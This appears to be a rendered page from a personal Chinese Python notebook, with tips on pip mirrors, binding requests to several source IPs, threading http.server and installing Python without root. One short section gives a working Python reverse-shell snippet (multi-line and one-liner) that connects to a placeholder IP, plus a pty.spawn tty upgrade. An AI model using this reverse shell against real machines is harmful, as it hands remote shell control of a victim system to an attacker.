  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#pip" class="md-nav__link">
    安装pip
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pip-mirrorsaliyuncom" class="md-nav__link">
    设置pip源 - mirrors.aliyun.com
  </a>
  
    <nav class="md-nav" aria-label="设置pip源 - mirrors.aliyun.com">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shell" class="md-nav__link">
    反弹shell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tty" class="md-nav__link">
    获得一个tty
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestsip" class="md-nav__link">
    让requests使用多个IP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python_1" class="md-nav__link">
    Python多线程模板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#httpserverbasehttpserver" class="md-nav__link">
    http.server（BaseHTTPServer）并发性改善
  </a>
  
    <nav class="md-nav" aria-label="http.server（BaseHTTPServer）并发性改善">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#new-version" class="md-nav__link">
    New version 不必修改库代码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#old-version" class="md-nav__link">
    Old version 修改库代码(不建议)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rootpython" class="md-nav__link">
    无root权限安装Python
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    中文输出乱码问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pep8" class="md-nav__link">
    遵循PEP8检查你的代码
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    生成随机字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python_2" class="md-nav__link">
    Python解方程
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#in" class="md-nav__link">
    大数据判断in
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonh-no-such-file-or-directory" class="md-nav__link">
    解决Python.h: No such file or directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    二进制字符串转普通字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bytes" class="md-nav__link">
    十六进制字符串转bytes字符串
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python3pat" class="md-nav__link">
    用Python3写PAT心得
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#requestspost" class="md-nav__link">
    用requests进行post
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tkinter" class="md-nav__link">
    通过tkinter获取、修改剪贴板
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    符号数与无符号数转换
  </a>
  
    <nav class="md-nav" aria-label="符号数与无符号数转换">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    无符号→有符号，为了加上负号：
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    有符号→无符号，为了去掉负号：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux" class="md-nav__link">
    使用signal.SIGALRM在限定时间后退出进程 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctrlc" class="md-nav__link">
    捕捉用户的Ctrl+C
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#signalsigalrm-only-linux_1" class="md-nav__link">
    使用signal.SIGALRM实现定时器 (only Linux)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pdb" class="md-nav__link">
    使用pdb进行调试
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonserverlessfunction-as-service" class="md-nav__link">
    使用Python开发Serverless(Function as Service)后端服务
  </a>
  
    <nav class="md-nav" aria-label="使用Python开发Serverless(Function as Service)后端服务">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    踩过的坑与解决过程(论阿里云是怎么把人气死的)
  </a>
  
    <nav class="md-nav" aria-label="踩过的坑与解决过程(论阿里云是怎么把人气死的)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1api" class="md-nav__link">
    1.API网关与函数计算的对接
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2api" class="md-nav__link">
    2.修改API网关参数定义后要再次发布
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3windowsfclifcliexe" class="md-nav__link">
    3.不能使用Windows版本的fcli工具(fcli.exe)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linuxgbk" class="md-nav__link">
    修复Linux下gbk编码的文件名
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crack-rsa" class="md-nav__link">
    Crack RSA!
  </a>
  
    <nav class="md-nav" aria-label="Crack RSA!">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    题目信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rsa" class="md-nav__link">
    RSA是啥
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    破解的数学原理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    实现它
  </a>
  
    <nav class="md-nav" aria-label="实现它">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ne" class="md-nav__link">
    题目给的公钥是啥格式，怎么读取出N和e?
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#n-pq" class="md-nav__link">
    怎么分解n 得到p和q？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#d" class="md-nav__link">
    怎么计算私钥d
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flagencint" class="md-nav__link">
    怎么把flag.enc当成一个int读入？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    计算明文
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag" class="md-nav__link">
    明文这么一个大数 我要的flag呢？
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    完整的代码
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    时间戳与字符串相互转换
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#redis" class="md-nav__link">
    用redis存储字典
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nexushd" class="md-nav__link">
    搬运种子 从北邮人搬运到NexusHD
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-seleniumdocker-chrome-headless" class="md-nav__link">
    python selenium+Docker chrome headless爬复杂网页
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonroot" class="md-nav__link">
    python丢弃root权限
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python-transmissionrpc" class="md-nav__link">
    python transmissionrpc
  </a>
  
    <nav class="md-nav" aria-label="python transmissionrpc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    上传一个种子 开始下载
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#torrent" class="md-nav__link">
    获取完整的torrent对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tracker" class="md-nav__link">
    给种子增加一个tracker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#torrenttracker" class="md-nav__link">
    修改一个.torrent文件的tracker
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#uwsgi" class="md-nav__link">
    uwsgi优雅重启
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flask" class="md-nav__link">
    flask设置一堆静态目录
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#python35-openutf-8" class="md-nav__link">
    Python3.5 open打开文件默认使用utf-8
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonurl" class="md-nav__link">
    Python提取url 正则匹配的回溯爆炸问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ubuntugmpy2" class="md-nav__link">
    ubuntu安装gmpy2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flask_1" class="md-nav__link">
    Flask模板 删去循环引入的多余空格
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sentry" class="md-nav__link">
    使用sentry
  </a>
  
    <nav class="md-nav" aria-label="使用sentry">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sentry_1" class="md-nav__link">
    不要过于依赖Sentry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pysysargv" class="md-nav__link">
    解决命令行执行py文件没有sys.argv的问题
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonwindows-chromecookie" class="md-nav__link">
    Python获取Windows Chrome的Cookie
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#winencodingutf-8" class="md-nav__link">
    Win开发摆脱每次都要写的encoding=utf-8
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ubuntu1604python37" class="md-nav__link">
    Ubuntu16.04安装Python3.7
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#keyboardinterrupt" class="md-nav__link">
    判断代码是否卡住，自动发送KeyboardInterrupt
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonstartup-pythonimport" class="md-nav__link">
    设置PYTHONSTARTUP环境变量 启动Python自动执行一些import
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pythonmongodb" class="md-nav__link">
    Python使用MongoDB
  </a>
  
    <nav class="md-nav" aria-label="Python使用MongoDB">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#server" class="md-nav__link">
    安装server
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    增删查改
  </a>
  
    <nav class="md-nav" aria-label="增删查改">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    查询
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    批量增加
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    删除
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#join" class="md-nav__link">
    多表join查询
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    随机采样
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pyenvpython" class="md-nav__link">
    使用pyenv编译安装不同版本的Python
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    发送钉钉消息
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mitmproxy" class="md-nav__link">
    使用mitmproxy
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/zjuchenyuan/notebook/edit/master/Python.md" title="Edit this page" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <h1 id="python">Python<a class="headerlink" href="#python" title="Permanent link">&para;</a></h1>
<p>嗯哼，Python很好玩呢&hellip;有人说Python是能运行的伪代码，就写代码的速度而言是显著优于C的，也有很多好用的类库呢，反正强烈推荐这门语言啦~</p>
<p>当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py</p>
<hr />
<h2 id="pip">安装pip<a class="headerlink" href="#pip" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code><span class="err">curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</span>
<span class="err">python get-pip.py</span>
</code></pre></div>


<h2 id="pip-mirrorsaliyuncom">设置pip源 - mirrors.aliyun.com<a class="headerlink" href="#pip-mirrorsaliyuncom" title="Permanent link">&para;</a></h2>
<p>如果只需要一次性安装个包（如Dockerfile）： </p>
<div class="codehilite"><pre><span></span><code><span class="err">pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span>
</code></pre></div>


<p>在Linux服务器上安装python的包时，执行这段代码可以将pip源改为国内的阿里镜像（豆瓣源似乎不再更新），能显著提高包的下载速度</p>
<div class="codehilite"><pre><span></span><code>mkdir -p ~/.pip
<span class="nb">echo</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">[global]</span>
<span class="s2">index-url = http://mirrors.aliyun.com/pypi/simple/</span>
<span class="s2">[install]</span>
<span class="s2">trusted-host=mirrors.aliyun.com</span>
<span class="s2">&quot;&quot;&quot;</span>&gt;~/.pip/pip.conf
</code></pre></div>


<p>至于Windows用户，在用户目录下创建一个pip目录，如：C:\Users\chenyuan\pip，新建文件pip.ini，内容如下：</p>
<div class="codehilite"><pre><span></span><code><span class="k">[global]</span>
<span class="na">index-url</span> <span class="o">=</span> <span class="s">http://mirrors.aliyun.com/pypi/simple/</span>
<span class="k">[install]</span>
<span class="na">trusted-host</span><span class="o">=</span><span class="s">mirrors.aliyun.com</span>
</code></pre></div>


<h3 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
<p>首先自己的服务器上用<strong>nc -l 端口</strong></p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span> <span class="s2">&quot;IP地址&quot;</span> <span class="p">,</span> <span class="n">端口</span> <span class="p">))</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
</code></pre></div>


<p>单行版本：</p>
<div class="codehilite"><pre><span></span><code><span class="n">IP</span><span class="o">=</span><span class="s2">&quot;x.x.x.x&quot;</span><span class="p">;</span><span class="n">PORT</span><span class="o">=</span><span class="mi">6666</span><span class="p">;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span> <span class="n">IP</span> <span class="p">,</span> <span class="n">PORT</span> <span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">])</span>
</code></pre></div>


<h3 id="tty">获得一个tty<a class="headerlink" href="#tty" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>


<hr />
<h2 id="requestsip">让requests使用多个IP<a class="headerlink" href="#requestsip" title="Permanent link">&para;</a></h2>
<p>requests包并没有使用socket.create_connection函数，所以替换socket.create_connection并不够</p>
<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">function_hook_parameter</span><span class="p">(</span><span class="n">oldfunc</span><span class="p">,</span> <span class="n">parameter_index</span><span class="p">,</span> <span class="n">parameter_name</span><span class="p">,</span> <span class="n">parameter_value</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    创造一个wrapper函数，劫持oldfunc传入的第parameter_index名为parameter_name的函数，固定其值为parameter_value; 不影响调用该函数时传入的任何其他参数</span>
<span class="sd">    用法： 原函数 = function_hook_parameter(原函数, 从1开始计数的参数所处的位置, 这个参数的名称, 需要替换成的参数值)</span>

<span class="sd">    例子： 需要劫持socket.create_connection这个函数，其函数原型如下： </span>
<span class="sd">               create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT, source_address=None)</span>
<span class="sd">           需要对其第3个参数source_address固定为value，劫持方法如下</span>
<span class="sd">               socket.create_connection = function_hook_parameter(socket.create_connection, 3, &quot;source_address&quot;, value)</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">real_func</span> <span class="o">=</span> <span class="n">oldfunc</span>
    <span class="k">def</span> <span class="nf">newfunc</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>  <span class="c1"># args是参数列表list，kwargs是带有名称keyword的参数dict</span>
        <span class="n">newargs</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">parameter_index</span><span class="p">:</span>  <span class="c1"># 如果这个参数被直接传入，那么肯定其前面的参数都是无名称的参数，args的长度肯定长于其所在的位置</span>
            <span class="n">newargs</span><span class="p">[</span><span class="n">parameter_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">parameter_value</span>  <span class="c1"># 第3个参数在list的下标是2</span>
        <span class="k">else</span><span class="p">:</span>  <span class="c1"># 如果不是直接传入，那么就在kwargs中 或者传入的可选参数中没有这个参数，直接设置kwargs即可</span>
            <span class="n">kwargs</span><span class="p">[</span><span class="n">parameter_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">parameter_value</span>
        <span class="k">return</span> <span class="n">real_func</span><span class="p">(</span><span class="o">*</span><span class="n">newargs</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">newfunc</span>


<span class="n">myip</span> <span class="o">=</span> <span class="s2">&quot;x.x.x.x&quot;</span> <span class="c1">#你需要使用的IP，需要操作系统已经取得这个IP</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">function_hook_parameter</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;source_address&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">myip</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">bakup_create_connection</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span> <span class="c1">#备份一份以备后续继续替换</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">function_hook_parameter</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;source_address&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">myip</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>

<span class="c1"># 验证是否成功修改源IP</span>
<span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://ip.cn&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="c1">#访问网站查看当前使用的公网IP，如果内网你可以自行搭建服务器查看访问日志从而确定IP</span>

<span class="c1"># 如果后续还要进行替换，则应该传入bakup_create_connection</span>
<span class="n">mynewip</span> <span class="o">=</span> <span class="s2">&quot;x.x.x.y&quot;</span> <span class="c1">#另外一个当前操作系统已经取得的IP</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">function_hook_parameter</span><span class="p">(</span><span class="n">bakup_create_connection</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;source_address&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">mynewip</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
</code></pre></div>


<hr />
<h2 id="python_1">Python多线程模板<a class="headerlink" href="#python_1" title="Permanent link">&para;</a></h2>
<p>使用threading模块进行开发</p>
<p><a href="../code/MultiThread_Template.py">MultiThread_Template.py</a></p>
<h2 id="httpserverbasehttpserver">http.server（BaseHTTPServer）并发性改善<a class="headerlink" href="#httpserverbasehttpserver" title="Permanent link">&para;</a></h2>
<h3 id="new-version">New version 不必修改库代码<a class="headerlink" href="#new-version" title="Permanent link">&para;</a></h3>
<p>在使用BaseHTTPServer.HTTPServer的时候，对其使用的父类修改创造自己的类，参考<a href="https://stackoverflow.com/questions/9539052/how-to-dynamically-change-base-class-of-instances-at-runtime">How to dynamically change base class of instances at runtime?</a></p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">BaseHTTPServer</span> <span class="c1"># 如果py3，需要import http.server as BaseHTTPServer</span>
<span class="kn">import</span> <span class="nn">socketserver</span>
<span class="n">MyHTTPServer</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="s1">&#39;MyHTTPServer&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">,),</span> <span class="nb">dict</span><span class="p">(</span><span class="n">BaseHTTPServer</span><span class="o">.</span><span class="n">HTTPServer</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">MyHandler</span><span class="p">(</span><span class="n">BaseHTTPServer</span><span class="o">.</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">pass</span> <span class="c1"># 省略handler的代码，一些do_GET，do_POST的函数</span>

<span class="n">httpd</span> <span class="o">=</span> <span class="n">MyHTTPServer</span><span class="p">(</span> <span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">),</span> <span class="n">MyHandler</span><span class="p">)</span>
<span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div>


<p>怎么知道MyHTTPServer的父类确实被修改了呢？ 可以查看其__mro__属性（Method Resolution Order attribute）</p>
<h3 id="old-version">Old version 修改库代码(不建议)<a class="headerlink" href="#old-version" title="Permanent link">&para;</a></h3>
<blockquote>
<p>参考资料：<a href="http://blog.csdn.net/cnmilan/article/details/9664823">利用Python中SocketServer 实现客户端与服务器间非阻塞通信</a></p>
<p>直接修改BaseHTTPServer的代码中的一个细节，将BaseHTTPServer类继承的原先只能支持单个请求的SocketServer.TCPServer改为每个连接一个线程的SocketServer.ThreadingTCPServer，使BaseHTTPServer能支持并发而不是一次只能处理单个请求</p>
</blockquote>
<p><strong>Python3的方法</strong>：</p>
<p>在Python3中BaseHTTPServer改名为http.server了，首先找到http.server所在的py文件：</p>
<div class="codehilite"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import http.server; print(http.server)&quot;</span>
</code></pre></div>


<p>修改其提示的文件，例如我这里是<code>/usr/lib/python3.4/http/server.py</code></p>
<p>搜索<code>class HTTPServer</code>，如果是用vim可以用<code>/class HTTPServer</code></p>
<p>修改找到的这一行，改为：</p>
<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">):</span>
</code></pre></div>


<p><strong>Python2的方法</strong>：</p>
<p>首先找到BaseHTTPServer在哪：</p>
<div class="codehilite"><pre><span></span><code> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import BaseHTTPServer; print(BaseHTTPServer)&quot;</span>
</code></pre></div>


<p>修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py，注意不要打开他直接提示的pyc文件而是要对应的同名py文件</p>
<p>找到这行（vim中可以输入<code>/class HTTPServer</code>进行搜索）：</p>
<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">):</span>
</code></pre></div>


<p>修改其继承的父类：</p>
<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="nc">HTTPServer</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">):</span>
</code></pre></div>


<hr />
<h2 id="rootpython">无root权限安装Python<a class="headerlink" href="#rootpython" title="Permanent link">&para;</a></h2>
<p>下载最新版python源码后指定prefix编译，假设用户目录为/home/chenyuan</p>
<div class="codehilite"><pre><span></span><code><span class="n">apt</span><span class="o">-</span><span class="k">get</span> <span class="k">install</span> <span class="n">libssl</span><span class="o">-</span><span class="n">dev</span> <span class="n">openssl</span> 
<span class="n">curl</span> <span class="o">-</span><span class="n">O</span> <span class="n">https</span><span class="o">://</span><span class="n">www</span><span class="p">.</span><span class="n">python</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">ftp</span><span class="o">/</span><span class="n">python</span><span class="o">/</span><span class="mf">3.5.2</span><span class="o">/</span><span class="n">Python</span><span class="o">-</span><span class="mf">3.5.2</span><span class="p">.</span><span class="n">tgz</span>
<span class="n">tar</span> <span class="o">-</span><span class="n">xzf</span> <span class="n">Python</span><span class="o">-</span><span class="mf">3.5.2</span><span class="p">.</span><span class="n">tgz</span>
<span class="n">cd</span> <span class="n">Python</span><span class="o">-</span><span class="mf">3.5.2</span><span class="o">/</span>
<span class="p">.</span><span class="o">/</span><span class="n">configure</span> <span class="o">--</span><span class="n">prefix</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">chenyuan</span><span class="o">/</span><span class="n">python3</span>
<span class="n">make</span>
<span class="n">make</span> <span class="k">install</span> <span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
<span class="n">pushd</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">chenyuan</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">bin</span>
<span class="n">cp</span> <span class="n">python3</span> <span class="n">python</span>
<span class="n">cp</span> <span class="n">pip3</span> <span class="n">pip</span>
<span class="n">alias</span> <span class="n">python3</span><span class="o">=</span><span class="n">`pwd`</span><span class="o">/</span><span class="n">python</span>
<span class="n">alias</span> <span class="n">pip3</span><span class="o">=</span><span class="n">`pwd`</span><span class="o">/</span><span class="n">pip</span>
</code></pre></div>


<hr />
<h2 id="_1">中文输出乱码问题<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>方法1：运行py前设置环境变量</p>
